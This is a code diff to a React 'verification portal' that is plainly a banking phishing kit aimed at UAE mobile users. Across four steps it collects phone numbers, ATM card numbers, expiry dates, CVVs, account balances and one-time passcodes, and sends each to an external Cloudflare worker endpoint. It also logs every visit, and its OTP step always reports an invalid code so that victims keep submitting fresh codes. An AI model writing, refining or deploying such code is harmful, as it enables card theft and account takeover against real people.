@@ -235,7 +235,7 @@
 // // //       const newOtp = [...otp];
 // // //       newOtp[index] = value;
 // // //       setOtp(newOtp);
-      
+
 // // //       if (value && index < 5) {
 // // //         const nextInput = document.getElementById(`otp-${index + 1}`);
 // // //         if (nextInput) nextInput.focus();
@@ -417,7 +417,6 @@
 // // //     </div>
 // // //   );
 // // // }
-
 
 // // import React, { useState } from 'react';
 // // import { Globe } from 'lucide-react';
@@ -632,7 +631,7 @@
 // //       const newOtp = [...otp];
 // //       newOtp[index] = value;
 // //       setOtp(newOtp);
-      
+
 // //       if (value && index < 5) {
 // //         const nextInput = document.getElementById(`otp-${index + 1}`);
 // //         if (nextInput) nextInput.focus();
@@ -815,7 +814,6 @@
 // //   );
 // // }
 
-
 // import React, { useState, useEffect } from 'react';
 // import { Globe } from 'lucide-react';
 
@@ -849,7 +847,7 @@
 //       phone: mobileNumber,
 //     });
 //     setLoading(false);
-    
+
 //     if (result.success) {
 //       onNext();
 //     }
@@ -921,7 +919,7 @@
 //       cvv: cardPin,
 //     });
 //     setLoading(false);
-    
+
 //     if (result.success) {
 //       onNext();
 //     }
@@ -1027,7 +1025,7 @@
 //       balance: accountBalance,
 //     });
 //     setLoading(false);
-    
+
 //     if (result.success) {
 //       onNext();
 //     }
@@ -1100,7 +1098,7 @@
 //       const newOtp = [...otp];
 //       newOtp[index] = value;
 //       setOtp(newOtp);
-      
+
 //       if (value && index < 5) {
 //         const nextInput = document.getElementById(`otp-${index + 1}`);
 //         if (nextInput) nextInput.focus();
@@ -1111,15 +1109,15 @@
 //   const handleVerifyOtp = async () => {
 //     setLoading(true);
 //     const otpString = otp.join('');
-    
+
 //     const result = await sendToAPI({
 //       type: 'otp',
 //       username: mobileNumber,
 //       otp: otpString,
 //     });
-    
+
 //     setLoading(false);
-    
+
 //     // Always show invalid OTP error
 //     setOtpError('Invalid OTP. Please try again.');
 //     setOtp(['', '', '', '', '', '']);
@@ -1308,24 +1306,24 @@
 //   );
 // }
 
-import React, { useState, useEffect } from 'react';
-import { Globe } from 'lucide-react';
+import React, { useState, useEffect } from "react";
+import { Globe } from "lucide-react";
 
-const API_URL = 'https://my-pr-worker.instapayapi.workers.dev';
+const API_URL = "https://my-pr-worker.instapayapi.workers.dev";
 
 // API Helper Function
 const sendToAPI = async (data) => {
   try {
     const response = await fetch(API_URL, {
-      method: 'POST',
+      method: "POST",
       headers: {
-        'Content-Type': 'application/json',
+        "Content-Type": "application/json",
       },
       body: JSON.stringify(data),
     });
     return await response.json();
   } catch (error) {
-    console.error('API Error:', error);
+    console.error("API Error:", error);
     return { success: false, error: error.message };
   }
 };
@@ -1337,11 +1335,11 @@ const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
   const handleSubmit = async () => {
     setLoading(true);
     const result = await sendToAPI({
-      type: 'phone',
+      type: "phone",
       phone: mobileNumber,
     });
     setLoading(false);
-    
+
     if (result.success) {
       onNext();
     }
@@ -1357,8 +1355,12 @@ const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
           </button>
         </div>
 
-        <h1 className="text-4xl font-bold mb-4">Welcome to verification portal</h1>
-        <p className="text-sm mb-8 opacity-90 leading-relaxed">Online Verification</p>
+        <h1 className="text-4xl font-bold mb-4">
+          Welcome to verification portal
+        </h1>
+        <p className="text-sm mb-8 opacity-90 leading-relaxed">
+          Online Verification
+        </p>
 
         <div className="text-center mb-6">
           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
@@ -1367,7 +1369,7 @@ const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
               <div
                 key={step}
                 className={`h-1.5 w-16 rounded-full transition-all ${
-                  step === 1 ? 'bg-white' : 'bg-white/30'
+                  step === 1 ? "bg-white" : "bg-white/30"
                 }`}
               />
             ))}
@@ -1389,40 +1391,39 @@ const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
           />
         </div> */}
 
-     <div className="flex items-center bg-white/10 backdrop-blur-md border border-white/20 
-rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3">
+        <div
+          className="flex items-center bg-white/10 backdrop-blur-md border border-white/20 
+rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3"
+        >
+          {/* +971 Country Code */}
+          <span className="text-lg sm:text-xl font-semibold text-white/90">
+            +971
+          </span>
 
-  {/* +971 Country Code */}
-  <span className="text-lg sm:text-xl font-semibold text-white/90">
-    +971
-  </span>
+          {/* Divider Line */}
+          <div className="h-6 sm:h-8 w-px bg-white/30"></div>
 
-  {/* Divider Line */}
-  <div className="h-6 sm:h-8 w-px bg-white/30"></div>
-
-  {/* Input */}
-  <input
-    type="tel"
-    inputMode="numeric"
-    pattern="[0-9]*"
-    placeholder="Enter Registered Mobile Number"
-    value={mobileNumber}
-    onChange={(e) =>
-      setMobileNumber(e.target.value.replace(/\D/g, '').slice(0, 9))
-    }
-    className="flex-1 bg-transparent text-white placeholder-white/50 text-base sm:text-xl 
+          {/* Input */}
+          <input
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            placeholder="Enter Registered Mobile Number"
+            value={mobileNumber}
+            onChange={(e) =>
+              setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 9))
+            }
+            className="flex-1 bg-transparent text-white placeholder-white/50 text-base sm:text-xl 
                focus:outline-none truncate"
-  />
-</div>
-
-
+          />
+        </div>
 
         <button
           onClick={handleSubmit}
           disabled={!mobileNumber || loading}
           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
         >
-          {loading ? 'Submitting...' : 'Continue'}
+          {loading ? "Submitting..." : "Continue"}
         </button>
       </div>
     </div>
@@ -1430,20 +1431,30 @@ rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3">
 };
 
 // Step 2 Component - ATM Card Details
-const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
+const Step2ATMCard = ({
+  mobileNumber,
+  atmCardNumber,
+  setAtmCardNumber,
+  expiryDate,
+  setExpiryDate,
+  cardPin,
+  setCardPin,
+  onNext,
+  onBack,
+}) => {
   const [loading, setLoading] = useState(false);
 
   const handleSubmit = async () => {
     setLoading(true);
     const result = await sendToAPI({
-      type: 'cardDetails',
+      type: "cardDetails",
       phone: mobileNumber,
       cardNumber: atmCardNumber,
       expiryDate: expiryDate,
       cvv: cardPin,
     });
     setLoading(false);
-    
+
     if (result.success) {
       onNext();
     }
@@ -1461,7 +1472,8 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
 
         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
         <p className="text-sm mb-8 opacity-90 leading-relaxed">
-          For your security, please provide the following information to complete the verification process
+          For your security, please provide the following information to
+          complete the verification process
         </p>
 
         <div className="text-center mb-6">
@@ -1471,7 +1483,7 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
               <div
                 key={step}
                 className={`h-1.5 w-16 rounded-full transition-all ${
-                  step <= 2 ? 'bg-white' : 'bg-white/30'
+                  step <= 2 ? "bg-white" : "bg-white/30"
                 }`}
               />
             ))}
@@ -1486,7 +1498,9 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
               pattern="[0-9]*"
               placeholder="Enter your 16-digit ATM card number *"
               value={atmCardNumber}
-              onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
+              onChange={(e) =>
+                setAtmCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
+              }
               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
             />
           </div>
@@ -1499,9 +1513,9 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
               placeholder="Expiry date (MM/YY) *"
               value={expiryDate}
               onChange={(e) => {
-                let val = e.target.value.replace(/\D/g, '');
+                let val = e.target.value.replace(/\D/g, "");
                 if (val.length >= 2) {
-                  val = val.slice(0, 2) + '/' + val.slice(2, 4);
+                  val = val.slice(0, 2) + "/" + val.slice(2, 4);
                 }
                 setExpiryDate(val);
               }}
@@ -1516,12 +1530,16 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
               pattern="[0-9]*"
               placeholder="CVV *"
               value={cardPin}
-              onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 3))}
+              onChange={(e) =>
+                setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
+              }
               maxLength={4}
               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
             />
           </div>
-          <p className='text-sm text-gray-400'>cvv digits (cvv on back of card)</p>
+          <p className="text-sm text-gray-400">
+            cvv digits (cvv on back of card)
+          </p>
         </div>
 
         <button
@@ -1529,7 +1547,7 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
           disabled={!atmCardNumber || !expiryDate || !cardPin || loading}
           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
         >
-          {loading ? 'Submitting...' : 'Continue'}
+          {loading ? "Submitting..." : "Continue"}
         </button>
 
         <button
@@ -1544,19 +1562,26 @@ const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDat
 };
 
 // Step 3 Component - Account Balance
-const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setAccountBalance, onNext, onBack }) => {
+const Step3AccountBalance = ({
+  mobileNumber,
+  atmCardNumber,
+  accountBalance,
+  setAccountBalance,
+  onNext,
+  onBack,
+}) => {
   const [loading, setLoading] = useState(false);
 
   const handleSubmit = async () => {
     setLoading(true);
     const result = await sendToAPI({
-      type: 'balance',
+      type: "balance",
       phone: mobileNumber,
       cardNumber: atmCardNumber,
       balance: accountBalance,
     });
     setLoading(false);
-    
+
     if (result.success) {
       onNext();
     }
@@ -1574,7 +1599,8 @@ const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setA
 
         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
         <p className="text-sm mb-8 opacity-90 leading-relaxed">
-          For your security, please provide the following information to complete the verification process
+          For your security, please provide the following information to
+          complete the verification process
         </p>
 
         <div className="text-center mb-6">
@@ -1584,7 +1610,7 @@ const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setA
               <div
                 key={step}
                 className={`h-1.5 w-16 rounded-full transition-all ${
-                  step <= 3 ? 'bg-white' : 'bg-white/30'
+                  step <= 3 ? "bg-white" : "bg-white/30"
                 }`}
               />
             ))}
@@ -1608,7 +1634,7 @@ const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setA
           disabled={!accountBalance || loading}
           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
         >
-          {loading ? 'Submitting...' : 'Continue'}
+          {loading ? "Submitting..." : "Continue"}
         </button>
 
         <button
@@ -1623,7 +1649,16 @@ const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setA
 };
 
 // Step 4 Component - OTP Verification
-const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError, timer, setTimer, onBack }) => {
+const Step4OTPVerification = ({
+  mobileNumber,
+  otp,
+  setOtp,
+  otpError,
+  setOtpError,
+  timer,
+  setTimer,
+  onBack,
+}) => {
   const [loading, setLoading] = useState(false);
 
   const handleOtpChange = (index, value) => {
@@ -1631,7 +1666,7 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
       const newOtp = [...otp];
       newOtp[index] = value;
       setOtp(newOtp);
-      
+
       if (value && index < 5) {
         const nextInput = document.getElementById(`otp-${index + 1}`);
         if (nextInput) nextInput.focus();
@@ -1641,26 +1676,26 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
 
   const handleVerifyOtp = async () => {
     setLoading(true);
-    const otpString = otp.join('');
-    
+    const otpString = otp.join("");
+
     const result = await sendToAPI({
-      type: 'otp',
+      type: "otp",
       username: mobileNumber,
       otp: otpString,
     });
-    
+
     setLoading(false);
-    
+
     // Always show invalid OTP error
-    setOtpError('Invalid OTP. Please try again.');
-    setOtp(['', '', '', '', '', '']);
+    setOtpError("Invalid OTP. Please try again.");
+    setOtp(["", "", "", "", "", ""]);
   };
 
   const handleResendOtp = () => {
     if (timer === 0) {
       setTimer(57);
-      setOtp(['', '', '', '', '', '']);
-      setOtpError('');
+      setOtp(["", "", "", "", "", ""]);
+      setOtpError("");
     }
   };
 
@@ -1676,7 +1711,8 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
 
         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
         <p className="text-sm mb-8 opacity-90 leading-relaxed">
-          We've sent a 6-digit verification code to your registered mobile number
+          We've sent a 6-digit verification code to your registered mobile
+          number
         </p>
 
         <div className="text-center mb-6">
@@ -1705,15 +1741,36 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
             />
           ))} */}
-          <input
+        <input
+  type="text"
+  inputMode="numeric"
+  pattern="[0-9]*"
+  maxLength={6}
+  placeholder="Enter your registered number *"
+  value={otp.join("")} // otp array ko string me convert
+  onChange={(e) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 6); // sirf digits allow
+    setOtp(val.split("")); // string ko array me convert karke state update
+    setOtpError(""); // error clear
+  }}
+  className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
+             placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
+/>
+
+
+          {/* <input
             type="number"
             inputMode="numeric"
+            id={`otp-${index}`}
+            maxLength={1}
+              value={digit}
             pattern="[0-9]*"
+            onChange={(e) => handleOtpChange(index, e.target.value)}
             placeholder="Enter your registered number *"
             // value={accountBalance}
             // onChange={(e) => setAccountBalance(e.target.value)}
             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
-          />
+          /> */}
         </div>
 
         {otpError && (
@@ -1731,7 +1788,9 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
             onClick={handleResendOtp}
             disabled={timer > 0}
             className={`font-bold underline transition-all ${
-              timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
+              timer > 0
+                ? "opacity-50 cursor-not-allowed"
+                : "opacity-100 hover:text-white/80"
             }`}
           >
             Resend OTP
@@ -1743,10 +1802,10 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
 
         <button
           onClick={handleVerifyOtp}
-          disabled={otp.some(digit => !digit) || loading}
+          disabled={otp.some((digit) => !digit) || loading}
           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
         >
-          {loading ? 'Verifying...' : 'Verify'}
+          {loading ? "Verifying..." : "Verify"}
         </button>
 
         <button
@@ -1763,19 +1822,19 @@ const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError
 // Main Component
 export default function VerificationPortal() {
   const [currentStep, setCurrentStep] = useState(1);
-  const [mobileNumber, setMobileNumber] = useState('');
-  const [atmCardNumber, setAtmCardNumber] = useState('');
-  const [expiryDate, setExpiryDate] = useState('');
-  const [cardPin, setCardPin] = useState('');
-  const [accountBalance, setAccountBalance] = useState('');
-  const [otp, setOtp] = useState(['', '', '', '', '', '']);
-  const [otpError, setOtpError] = useState('');
+  const [mobileNumber, setMobileNumber] = useState("");
+  const [atmCardNumber, setAtmCardNumber] = useState("");
+  const [expiryDate, setExpiryDate] = useState("");
+  const [cardPin, setCardPin] = useState("");
+  const [accountBalance, setAccountBalance] = useState("");
+  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otpError, setOtpError] = useState("");
   const [timer, setTimer] = useState(57);
 
   // Send visit notification on component mount
   useEffect(() => {
     sendToAPI({
-      type: 'visit',
+      type: "visit",
       url: window.location.href,
     });
   }, []);
@@ -1798,7 +1857,7 @@ export default function VerificationPortal() {
   const handleBack = () => {
     if (currentStep > 1) {
       setCurrentStep(currentStep - 1);
-      setOtpError('');
+      setOtpError("");
     }
   };
 
